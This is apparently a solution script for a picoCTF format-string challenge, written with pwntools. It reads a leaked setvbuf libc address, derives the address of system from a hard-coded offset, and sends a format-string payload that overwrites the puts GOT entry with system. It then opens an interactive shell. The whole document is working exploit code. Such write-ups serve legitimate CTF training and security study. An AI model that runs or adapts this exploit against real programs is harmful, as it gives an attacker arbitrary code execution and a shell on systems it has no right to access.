#! /usr/bin/python3

from pwn import *

context.update(arch='amd64')

p = process('./format-string-3')  
#p = remote('rhea.picoctf.net',53286)

info(p.recvline())       # Fetch Howdy Gamers!
info(p.recvuntil('libc: '))

# Get setvbuffer address in string and convert to int
setvbuf_addr_str = p.recvline().strip()
setvbuf_addr = int(setvbuf_addr_str,16)
info('Leaked setvbuf address: %s', hex(setvbuf_addr))

#INFO I GOT
puts_addr = 0x404018
# setvbuf address in libc = 0x7a3f0
# system address in libc = 0x4f760
#offset setvbuf - system = 175248
#user input start from 38th of stack

# Calculate system address
offset = 175248
system_addr = setvbuf_addr - offset
info('Calculated system address: %s', hex(system_addr))

# Crafting payload
info('Crafting payload...')
payload = fmtstr_payload(38, {puts_addr : system_addr})

# Send payload
info('Sending payload...')
p.sendline(payload)
p.clean()

# Get the shell
info('Successful payload, got the shell')
p.interactive()
